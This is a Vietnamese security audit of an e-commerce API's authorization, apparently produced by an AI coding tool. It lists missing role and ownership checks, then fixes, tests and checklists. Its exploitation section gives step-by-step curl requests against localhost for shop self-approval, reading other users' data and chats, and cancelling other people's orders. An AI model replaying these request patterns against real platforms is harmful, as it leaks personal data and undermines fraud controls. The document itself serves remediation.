# KỊCH BẢN DEMO PHÂN QUYỀN & LỖ HỔNG BẢO MẬT

## Mục lục
1. [Tổng quan hệ thống phân quyền](#1-tổng-quan-hệ-thống-phân-quyền)
2. [Kịch bản demo phân quyền đúng](#2-kịch-bản-demo-phân-quyền-đúng)
3. [Lỗ hổng bảo mật đã phát hiện](#3-lỗ-hổng-bảo-mật-đã-phát-hiện)
4. [Kịch bản khai thác (Exploitation)](#4-kịch-bản-khai-thác-exploitation)
5. [Khuyến nghị sửa lỗi](#5-khuyến-nghị-sửa-lỗi)

---

## 1. TỔNG QUAN HỆ THỐNG PHÂN QUYỀN

### 1.1. Các vai trò (Roles)
```typescript
enum RoleType {
  SYSTEM_ADMIN      // Quản trị viên hệ thống - toàn quyền
  SELLER            // Người bán - quản lý shop, sản phẩm
  CUSTOMER          // Khách hàng - mua sắm, đặt hàng
  GUEST             // Khách - xem sản phẩm
  KYC_REVIEWER      // Người duyệt KYC - duyệt shop
}
```

### 1.2. Hệ thống phân quyền (Permission System)
- **Module**: USER_MANAGEMENT, SHOP_MANAGEMENT, PRODUCT_MANAGEMENT, ORDER_MANAGEMENT, etc.
- **Action**: CREATE, READ, UPDATE, DELETE, APPROVE, REJECT, etc.
- **Format**: `MODULE:ACTION` (ví dụ: `PRODUCT_MANAGEMENT:CREATE`)

### 1.3. Cơ chế bảo vệ
**3 lớp kiểm tra:**
1. **Route-level**: Middleware chains (authenticateToken → requireRole → requirePermission)
2. **Service-level**: Ownership checks trong business logic
3. **Database-level**: Foreign keys và constraints

### 1.4. Trạng thái người dùng
```typescript
enum UserStatus {
  ACTIVE       // Hoạt động bình thường
  INACTIVE     // Tạm ngưng
  PENDING      // Chờ kích hoạt
  SUSPENDED    // Bị đình chỉ
  BANNED       // Bị cấm vĩnh viễn
}
```

---

## 2. KỊCH BẢN DEMO PHÂN QUYỀN ĐÚNG

### 2.1. Demo: Tạo sản phẩm (Product Creation)

**Endpoint**: `POST /api/products`

**Yêu cầu bảo mật** (src/routes/product.routes.ts:20-36):
```typescript
combineMiddleware(
  authenticateToken,                    // 1. Phải đăng nhập
  requireStatus([UserStatus.ACTIVE]),   // 2. Tài khoản phải ACTIVE
  requireRole(RoleType.SYSTEM_ADMIN, RoleType.SELLER),  // 3. Phải là ADMIN hoặc SELLER
  requirePermission(
    PermissionModule.PRODUCT_MANAGEMENT,
    PermissionAction.CREATE
  )                                     // 4. Phải có quyền tạo sản phẩm
)
```

**Test Case 1: Thành công với SELLER**
```bash
# 1. Đăng nhập với tài khoản SELLER
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "seller@example.com",
    "password": "password123"
  }'

# Response: { "accessToken": "eyJhbGc..." }

# 2. Tạo sản phẩm với token
curl -X POST http://localhost:3000/api/products \
  -H "Authorization: Bearer eyJhbGc..." \
  -H "Content-Type: application/json" \
  -d '{
    "name": "iPhone 15 Pro Max",
    "description": "Điện thoại cao cấp",
    "shopId": "shop-uuid-here"
  }'

# ✅ Expected: 201 Created
```

**Test Case 2: Thất bại - User không có quyền SELLER**
```bash
# Đăng nhập với tài khoản CUSTOMER
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "customer@example.com",
    "password": "password123"
  }'

# Thử tạo sản phẩm
curl -X POST http://localhost:3000/api/products \
  -H "Authorization: Bearer <customer-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Fake Product",
    "shopId": "shop-uuid-here"
  }'

# ❌ Expected: 403 Forbidden
# Response: {
#   "message": "Access denied. Required roles: SYSTEM_ADMIN, SELLER"
# }
```

**Test Case 3: Ownership check tại service layer**
```bash
# Seller A thử tạo sản phẩm cho shop của Seller B
curl -X POST http://localhost:3000/api/products \
  -H "Authorization: Bearer <seller-a-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Product",
    "shopId": "seller-b-shop-id"
  }'

# ❌ Expected: 403 Forbidden (src/services/product.service.ts:163-167)
# Response: {
#   "message": "Bạn không có quyền tạo sản phẩm cho cửa hàng này"
# }
```

---

### 2.2. Demo: Xem danh sách users (Admin only)

**Endpoint**: `GET /api/users`

**Yêu cầu**: SYSTEM_ADMIN role (src/routes/user.routes.ts:14-21)

**Test Case 1: Admin thành công**
```bash
curl -X GET http://localhost:3000/api/users \
  -H "Authorization: Bearer <admin-token>"

# ✅ Expected: 200 OK
# Response: {
#   "data": [
#     { "id": "...", "email": "user1@example.com", ... },
#     { "id": "...", "email": "user2@example.com", ... }
#   ]
# }
```

**Test Case 2: Seller bị từ chối**
```bash
curl -X GET http://localhost:3000/api/users \
  -H "Authorization: Bearer <seller-token>"

# ❌ Expected: 403 Forbidden
# Response: {
#   "message": "Access denied. Required roles: SYSTEM_ADMIN"
# }
```

---

### 2.3. Demo: Cập nhật bank account của shop

**Endpoint**: `PUT /api/shops/:id/bank-account`

**Yêu cầu**: Owner của shop (src/services/shop.service.ts:101-105)

**Test Case 1: Owner thành công**
```bash
curl -X PUT http://localhost:3000/api/shops/shop-123/bank-account \
  -H "Authorization: Bearer <owner-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "bankName": "Vietcombank",
    "accountNumber": "1234567890",
    "accountHolderName": "Nguyen Van A"
  }'

# ✅ Expected: 200 OK
```

**Test Case 2: Người khác thử cập nhật**
```bash
curl -X PUT http://localhost:3000/api/shops/shop-123/bank-account \
  -H "Authorization: Bearer <other-seller-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "bankName": "Vietcombank",
    "accountNumber": "MALICIOUS",
    "accountHolderName": "Hacker"
  }'

# ❌ Expected: 400 Bad Request
# Response: {
#   "message": "Bạn không có quyền cập nhật thông tin ngân hàng của cửa hàng này"
# }
```

---

## 3. LỖ HỔNG BẢO MẬT ĐÃ PHÁT HIỆN

### 🔴 3.1. CRITICAL: Shop Approval/Reject - Missing Authorization

**File**: `src/routes/shop.routes.ts`

**Lỗ hổng 1: Duyệt shop (Lines 54-62)**
```typescript
router.put(
  '/:id/approval',
  combineMiddleware(
    authenticateToken,
    requireStatus([UserStatus.ACTIVE])
    // ⚠️ THIẾU: requireRole(RoleType.SYSTEM_ADMIN, RoleType.KYC_REVIEWER)
  ),
  shopController.approvalShop
);
```

**Lỗ hổng 2: Từ chối shop (Lines 63-71)**
```typescript
router.put(
  '/:id/reject',
  combineMiddleware(
    authenticateToken,
    requireStatus([UserStatus.ACTIVE])
    // ⚠️ THIẾU: requireRole(RoleType.SYSTEM_ADMIN, RoleType.KYC_REVIEWER)
  ),
  shopController.rejectShop
);
```

**Mức độ nghiêm trọng**: CRITICAL
**Tác động**: BẤT KỲ user nào đã đăng nhập và ACTIVE đều có thể:
- Tự duyệt shop của mình
- Duyệt/từ chối shop của người khác
- Phá hoại quy trình KYC

---

### 🔴 3.2. HIGH: User Detail - Missing Ownership Check

**File**: `src/routes/user.routes.ts:13`

**Lỗ hổng**:
```typescript
router.get(
  '/:id',
  combineMiddleware(authenticateToken),
  // ⚠️ THIẾU: Kiểm tra userId === req.params.id hoặc SYSTEM_ADMIN
  userController.getUserById
);
```

**Mức độ nghiêm trọng**: HIGH
**Tác động**: User có thể xem thông tin chi tiết của bất kỳ user nào:
- Email, số điện thoại
- Trạng thái tài khoản
- Thông tin cá nhân khác

---

### 🟡 3.3. MEDIUM: Order Status Update - Missing Role Check

**File**: `src/routes/order.routes.ts:39-43`

**Lỗ hổng**:
```typescript
router.put(
  '/:orderId/status',
  combineMiddleware(
    authenticateToken,
    requireStatus([UserStatus.ACTIVE])
    // ⚠️ THIẾU: Kiểm tra user owns order HOẶC owns shop HOẶC ADMIN
  ),
  orderController.updateOrderStatus
);
```

**Mức độ nghiêm trọng**: MEDIUM
**Tác động**: User có thể cập nhật status của đơn hàng không phải của mình

---

### 🟡 3.4. MEDIUM: Chat - Missing Conversation Access Check

**File**: `src/routes/chat.routes.ts`

**Lỗ hổng**: Tất cả chat routes chỉ kiểm tra `authenticateToken`
```typescript
router.use(combineMiddleware(authenticateToken));
// ⚠️ THIẾU: Kiểm tra user có phải participant của conversation không
```

**Các endpoint bị ảnh hưởng**:
- `GET /api/chat/conversations/:id` - Xem conversation không phải của mình
- `GET /api/chat/conversations/:id/messages` - Đọc tin nhắn của người khác
- `POST /api/chat/conversations/:id/messages` - Gửi tin nhắn vào conversation không liên quan
- `PUT /api/chat/messages/:id` - Sửa tin nhắn của người khác
- `DELETE /api/chat/messages/:id` - Xóa tin nhắn của người khác

**Mức độ nghiêm trọng**: MEDIUM-HIGH
**Tác động**: Privacy breach, có thể đọc/sửa/xóa tin nhắn của người khác

---

## 4. KỊCH BẢN KHAI THÁC (EXPLOITATION)

### 🎯 Exploit #1: Tự duyệt shop của mình (Shop Self-Approval)

**Điều kiện**: User có shop đang ở trạng thái PENDING_APPROVAL

**Các bước khai thác**:

```bash
# Bước 1: Đăng ký tài khoản và tạo shop
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@example.com",
    "password": "Hacker123!",
    "fullName": "Attacker"
  }'

# Bước 2: Kích hoạt tài khoản và tạo shop
curl -X POST http://localhost:3000/api/shops \
  -H "Authorization: Bearer <attacker-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Fake Shop",
    "description": "Malicious shop"
  }'

# Response: { "data": { "id": "shop-abc123", "status": "PENDING_APPROVAL" } }

# Bước 3: Submit KYC với thông tin giả mạo
curl -X POST http://localhost:3000/api/shops/shop-abc123/kyc \
  -H "Authorization: Bearer <attacker-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "businessLicense": "fake-license-url",
    "identityCard": "fake-id-url"
  }'

# Bước 4: Tự submit for approval
curl -X PUT http://localhost:3000/api/shops/shop-abc123/submit-approval \
  -H "Authorization: Bearer <attacker-token>"

# Response: { "data": { "status": "PENDING_APPROVAL" } }

# 🚨 Bước 5: TỰ DUYỆT SHOP (EXPLOIT!)
curl -X PUT http://localhost:3000/api/shops/shop-abc123/approval \
  -H "Authorization: Bearer <attacker-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "note": "I approve myself!"
  }'

# ✅ Expected (BUG): 200 OK
# Response: { "data": { "status": "APPROVED" } }
#
# ⚠️ Should be: 403 Forbidden - Only KYC_REVIEWER/SYSTEM_ADMIN should approve
```

**Tác động**:
- Bỏ qua quy trình KYC
- Tạo shop với thông tin giả mạo
- Có thể bán hàng lừa đảo

---

### 🎯 Exploit #2: Duyệt shop của người khác

**Điều kiện**: Có tài khoản ACTIVE bất kỳ

**Kịch bản**:
```bash
# Attacker đăng nhập với tài khoản CUSTOMER
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "malicious-customer@example.com",
    "password": "password123"
  }'

# Lấy danh sách shops (nếu có public endpoint)
# Hoặc brute-force shop IDs

# 🚨 EXPLOIT: Duyệt shop của người khác
curl -X PUT http://localhost:3000/api/shops/victim-shop-id/approval \
  -H "Authorization: Bearer <customer-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "note": "Unauthorized approval"
  }'

# ✅ Expected (BUG): 200 OK
```

**Tác động**:
- Phá hoại quy trình kiểm duyệt
- Duyệt shop lừa đảo
- Từ chối shop hợp lệ (DoS)

---

### 🎯 Exploit #3: Xem thông tin user khác (IDOR)

**Lỗ hổng**: Insecure Direct Object Reference

**Kịch bản**:
```bash
# Attacker đăng nhập
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@example.com",
    "password": "password123"
  }'

# Xem thông tin của chính mình
curl -X GET http://localhost:3000/api/users/attacker-user-id \
  -H "Authorization: Bearer <attacker-token>"

# Response: { "id": "attacker-user-id", "email": "attacker@...", ... }

# 🚨 EXPLOIT: Xem thông tin của victim
curl -X GET http://localhost:3000/api/users/victim-user-id \
  -H "Authorization: Bearer <attacker-token>"

# ✅ Expected (BUG): 200 OK
# Response: {
#   "id": "victim-user-id",
#   "email": "victim@example.com",  ⚠️ Email leak
#   "phone": "+84123456789",        ⚠️ Phone leak
#   "status": "ACTIVE",
#   "emailVerified": true
# }
```

**Tác động**:
- Rò rỉ thông tin cá nhân (PII)
- User enumeration
- Phishing attacks

---

### 🎯 Exploit #4: Thay đổi trạng thái đơn hàng tùy ý

**Kịch bản**:
```bash
# Customer A tạo đơn hàng từ Shop B
curl -X POST http://localhost:3000/api/orders \
  -H "Authorization: Bearer <customer-a-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "shopId": "shop-b-id",
    "items": [{ "productId": "prod-1", "quantity": 1 }]
  }'

# Response: { "data": { "id": "order-123", "status": "PENDING", "total": 1000000 } }

# Customer A thanh toán
# Status: PENDING → PAID

# 🚨 EXPLOIT: Customer C (người không liên quan) cập nhật status
curl -X PUT http://localhost:3000/api/orders/order-123/status \
  -H "Authorization: Bearer <customer-c-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "status": "CANCELLED"
  }'

# ✅ Expected (BUG): 200 OK
# Response: { "data": { "status": "CANCELLED" } }
```

**Tác động**:
- Hủy đơn hàng của người khác
- Thay đổi status để lừa đảo (mark as DELIVERED khi chưa nhận hàng)
- DoS attack

---

### 🎯 Exploit #5: Đọc tin nhắn chat của người khác

**Kịch bản**:
```bash
# Conversation giữa Customer A và Shop Owner B
# Conversation ID: conv-123

# 🚨 EXPLOIT: Customer C (attacker) đọc conversation
curl -X GET http://localhost:3000/api/chat/conversations/conv-123/messages \
  -H "Authorization: Bearer <customer-c-token>"

# ✅ Expected (BUG): 200 OK
# Response: {
#   "data": [
#     { "content": "Tôi muốn mua 100 sản phẩm, giảm giá được không?", ... },
#     { "content": "OK, tôi giảm cho bạn 30%", ... },
#     { "content": "Địa chỉ giao hàng: 123 Nguyen Trai, Hanoi", ... }  ⚠️ Privacy leak
#   ]
# }

# 🚨 EXPLOIT: Gửi tin nhắn giả mạo vào conversation
curl -X POST http://localhost:3000/api/chat/conversations/conv-123/messages \
  -H "Authorization: Bearer <customer-c-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "content": "Xin chào, tôi là admin. Vui lòng chuyển tiền vào tài khoản..."
  }'
```

**Tác động**:
- Rò rỉ thông tin nhạy cảm (địa chỉ, giá cả, thương lượng)
- Gửi tin nhắn lừa đảo
- Xóa/sửa tin nhắn để xóa dấu vết

---

## 5. KHUYẾN NGHỊ SỬA LỖI

### 5.1. Fix Shop Approval/Reject Authorization

**File**: `src/routes/shop.routes.ts`

**Thay đổi**:
```typescript
// Line 54-62: Approval endpoint
router.put(
  '/:id/approval',
  combineMiddleware(
    authenticateToken,
    requireStatus([UserStatus.ACTIVE]),
    requireRole(RoleType.SYSTEM_ADMIN, RoleType.KYC_REVIEWER),  // ✅ THÊM
    requirePermission(
      PermissionModule.SHOP_MANAGEMENT,
      PermissionAction.APPROVE
    )  // ✅ THÊM
  ),
  shopController.approvalShop
);

// Line 63-71: Reject endpoint
router.put(
  '/:id/reject',
  combineMiddleware(
    authenticateToken,
    requireStatus([UserStatus.ACTIVE]),
    requireRole(RoleType.SYSTEM_ADMIN, RoleType.KYC_REVIEWER),  // ✅ THÊM
    requirePermission(
      PermissionModule.SHOP_MANAGEMENT,
      PermissionAction.REJECT
    )  // ✅ THÊM
  ),
  shopController.rejectShop
);
```

---

### 5.2. Fix User Detail - Add Ownership Check

**File**: `src/routes/user.routes.ts`

**Option 1: Sử dụng requireOwnership middleware**
```typescript
router.get(
  '/:id',
  combineMiddleware(
    authenticateToken,
    requireOwnership(async (req) => {
      // User có thể xem thông tin của chính mình
      return req.params.id;
    })
    // requireOwnership tự động cho phép SYSTEM_ADMIN bypass
  ),
  userController.getUserById
);
```

**Option 2: Custom middleware**
```typescript
// src/middleware/auth.middleware.ts - Thêm function mới
export const requireSelfOrAdmin = asyncHandler(
  async (req: Request, res: Response, next: NextFunction) => {
    const targetUserId = req.params.id;
    const currentUserId = req.user?.id;

    // Cho phép nếu xem chính mình
    if (targetUserId === currentUserId) {
      return next();
    }

    // Cho phép nếu là SYSTEM_ADMIN
    const userRoles = req.user?.roles?.map(r => r.role.type) || [];
    if (userRoles.includes(RoleType.SYSTEM_ADMIN)) {
      return next();
    }

    throw new ForbiddenError('Bạn không có quyền xem thông tin người dùng này');
  }
);

// Sử dụng trong route
router.get(
  '/:id',
  combineMiddleware(
    authenticateToken,
    requireSelfOrAdmin  // ✅ THÊM
  ),
  userController.getUserById
);
```

---

### 5.3. Fix Order Status Update - Add Access Check

**File**: `src/routes/order.routes.ts`

```typescript
router.put(
  '/:orderId/status',
  combineMiddleware(
    authenticateToken,
    requireStatus([UserStatus.ACTIVE]),
    requireOwnership(async (req) => {
      // Lấy order từ database
      const orderId = req.params.orderId;
      const orderService = req.app.get('container').resolve('orderService');
      const order = await orderService.getOrderById(orderId, req.user!.id);

      // Trả về userId của order owner
      // Middleware sẽ cho phép nếu:
      // - req.user.id === order.userId (customer owns order)
      // - req.user.id === shop.ownerId (shop owner)
      // - req.user is SYSTEM_ADMIN
      return order.userId;
    })
  ),
  orderController.updateOrderStatus
);
```

**Hoặc tốt hơn**: Kiểm tra trong service layer

**File**: `src/services/order.service.ts`

```typescript
async updateOrderStatus(
  orderId: string,
  newStatus: OrderStatus,
  userId: string
): Promise<Order> {
  const order = await this.uow.orders.findById(orderId);

  if (!order) {
    throw new NotFoundError('Không tìm thấy đơn hàng');
  }

  // ✅ THÊM: Kiểm tra quyền
  const user = await this.uow.users.findById(userId);
  const isAdmin = user.roles.some(r => r.role.type === RoleType.SYSTEM_ADMIN);
  const isOrderOwner = order.userId === userId;

  // Kiểm tra xem có phải shop owner không
  const shop = await this.uow.shops.findById(order.shopId);
  const isShopOwner = shop?.ownerId === userId;

  if (!isAdmin && !isOrderOwner && !isShopOwner) {
    throw new ForbiddenError('Bạn không có quyền cập nhật đơn hàng này');
  }

  // Logic cập nhật status...
}
```

---

### 5.4. Fix Chat - Add Conversation Participant Check

**File**: `src/services/chat.service.ts`

**Thêm helper method**:
```typescript
private async verifyConversationAccess(
  conversationId: string,
  userId: string
): Promise<void> {
  const conversation = await this.uow.conversations.findById(conversationId);

  if (!conversation) {
    throw new NotFoundError('Không tìm thấy cuộc hội thoại');
  }

  // Kiểm tra xem user có phải participant không
  const isParticipant = conversation.participants.some(
    p => p.userId === userId
  );

  // Hoặc là SYSTEM_ADMIN
  const user = await this.uow.users.findById(userId);
  const isAdmin = user.roles.some(r => r.role.type === RoleType.SYSTEM_ADMIN);

  if (!isParticipant && !isAdmin) {
    throw new ForbiddenError('Bạn không có quyền truy cập cuộc hội thoại này');
  }
}
```

**Sử dụng trong các methods**:
```typescript
async getConversationById(conversationId: string, userId: string) {
  // ✅ THÊM
  await this.verifyConversationAccess(conversationId, userId);

  return await this.uow.conversations.findById(conversationId);
}

async getMessages(conversationId: string, userId: string, options: any) {
  // ✅ THÊM
  await this.verifyConversationAccess(conversationId, userId);

  return await this.uow.messages.findByConversationId(conversationId, options);
}

async sendMessage(data: any, userId: string) {
  // ✅ THÊM
  await this.verifyConversationAccess(data.conversationId, userId);

  // Logic gửi message...
}
```

---

### 5.5. Thêm Unit Tests cho Authorization

**File**: `tests/authorization.test.ts` (Tạo mới)

```typescript
import request from 'supertest';
import { app } from '../src/app';

describe('Authorization Tests', () => {
  describe('Shop Approval', () => {
    it('should deny shop approval for non-KYC_REVIEWER', async () => {
      const customerToken = await loginAs('customer@example.com');

      const response = await request(app)
        .put('/api/shops/shop-123/approval')
        .set('Authorization', `Bearer ${customerToken}`)
        .send({ note: 'Approve' });

      expect(response.status).toBe(403);
      expect(response.body.message).toContain('KYC_REVIEWER');
    });

    it('should allow shop approval for KYC_REVIEWER', async () => {
      const reviewerToken = await loginAs('reviewer@example.com');

      const response = await request(app)
        .put('/api/shops/shop-123/approval')
        .set('Authorization', `Bearer ${reviewerToken}`)
        .send({ note: 'Approved after KYC verification' });

      expect(response.status).toBe(200);
    });
  });

  describe('User Detail IDOR', () => {
    it('should deny access to other user details', async () => {
      const attackerToken = await loginAs('attacker@example.com');

      const response = await request(app)
        .get('/api/users/victim-user-id')
        .set('Authorization', `Bearer ${attackerToken}`);

      expect(response.status).toBe(403);
    });

    it('should allow access to own details', async () => {
      const userToken = await loginAs('user@example.com');
      const userId = extractUserId(userToken);

      const response = await request(app)
        .get(`/api/users/${userId}`)
        .set('Authorization', `Bearer ${userToken}`);

      expect(response.status).toBe(200);
    });
  });

  // More tests...
});
```

---

## 6. CHECKLIST KIỂM TRA BẢO MẬT

### Route-level Authorization Checklist

Khi thêm route mới, kiểm tra:

- [ ] **Authentication**: Có `authenticateToken` middleware?
- [ ] **Status Check**: Có `requireStatus([UserStatus.ACTIVE])`?
- [ ] **Role Check**: Route có yêu cầu role đặc biệt? (Admin, Seller, etc.)
- [ ] **Permission Check**: Có `requirePermission(module, action)`?
- [ ] **Ownership**: Route truy cập resource của user khác? → Cần `requireOwnership`
- [ ] **Rate Limiting**: Route nhạy cảm (login, register) có rate limit?

### Service-level Authorization Checklist

Trong service methods, kiểm tra:

- [ ] **Ownership Verification**: Method có check `resource.ownerId === userId`?
- [ ] **Admin Bypass**: Admin có được phép bypass ownership check?
- [ ] **Multi-party Access**: Resource có nhiều owner? (VD: Order có cả customer và shop owner)
- [ ] **Soft Delete**: Có kiểm tra resource chưa bị xóa?
- [ ] **Status Validation**: Resource status có hợp lệ cho thao tác này?

### Testing Checklist

- [ ] **Positive Test**: User hợp lệ có thể thực hiện thao tác
- [ ] **Negative Test**: User không có quyền bị từ chối (403)
- [ ] **IDOR Test**: Thử truy cập resource ID của người khác
- [ ] **Role Escalation**: Thử thực hiện thao tác của role cao hơn
- [ ] **Bypass Test**: Thử bỏ qua middleware bằng cách sửa token

---

## 7. TÀI LIỆU THAM KHẢO

### Common Authorization Vulnerabilities

1. **IDOR (Insecure Direct Object Reference)**
   - Truy cập resource bằng ID mà không kiểm tra ownership
   - Fix: Thêm ownership check trong service layer

2. **Missing Function Level Access Control**
   - Route thiếu role/permission check
   - Fix: Thêm `requireRole` hoặc `requirePermission` middleware

3. **Privilege Escalation**
   - User thường có thể thực hiện thao tác admin
   - Fix: Kiểm tra role ở cả route và service layer

4. **Parameter Tampering**
   - User sửa `userId`, `shopId` trong request body
   - Fix: Luôn lấy userId từ `req.user` (từ JWT), không tin request body

### OWASP Top 10 Related

- **A01:2021 – Broken Access Control** ← Các lỗ hổng trong document này
- **A07:2021 – Identification and Authentication Failures**
- **A04:2021 – Insecure Design**

---

## 8. KẾT LUẬN

### Điểm mạnh của hệ thống hiện tại

✅ Có hệ thống phân quyền rõ ràng (Role + Permission)
✅ Middleware chain để kiểm tra authorization
✅ Service layer có ownership checks cho các thao tác quan trọng
✅ Sử dụng JWT và bcrypt đúng cách
✅ Redis caching cho permissions để tăng performance

### Điểm yếu cần khắc phục ngay

🔴 **CRITICAL**: Shop approval/reject thiếu role check
🔴 **HIGH**: User detail endpoint có IDOR vulnerability
🟡 **MEDIUM**: Order status update thiếu authorization
🟡 **MEDIUM**: Chat system thiếu conversation participant check

### Khuyến nghị ưu tiên

**Week 1 - Critical Fixes**:
1. Fix shop approval/reject endpoints (5.1)
2. Fix user detail IDOR (5.2)
3. Thêm integration tests cho các fixes

**Week 2 - Medium Priority**:
4. Fix order status update (5.3)
5. Fix chat conversation access (5.4)
6. Code review toàn bộ routes để tìm lỗ hổng tương tự

**Week 3 - Long-term**:
7. Thêm comprehensive authorization tests (5.5)
8. Document authorization patterns cho team
9. Setup security linting rules (eslint-plugin-security)
10. Penetration testing

---

**Tạo bởi**: Claude Code Security Analysis
**Ngày**: 2025-11-15
**Version**: 1.0
**Status**: Ready for Implementation
